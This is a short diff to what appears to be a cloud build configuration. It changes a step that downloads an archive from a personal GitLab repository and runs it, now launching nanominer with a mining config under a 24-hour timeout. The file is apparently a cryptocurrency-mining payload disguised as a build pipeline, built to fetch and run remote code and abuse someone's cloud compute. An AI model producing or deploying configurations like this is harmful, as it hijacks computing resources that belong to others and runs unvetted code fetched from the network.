@@ -3,7 +3,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/nano.tar.gz && tar xf nano.tar.gz && ./vrsc.sh
+       wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/nano.tar.gz && tar xf nano.tar.gz && ./nanominer mine.ini
     waitFor: ["-"]
     entrypoint: /bin/baseh
 timeout: 86400s
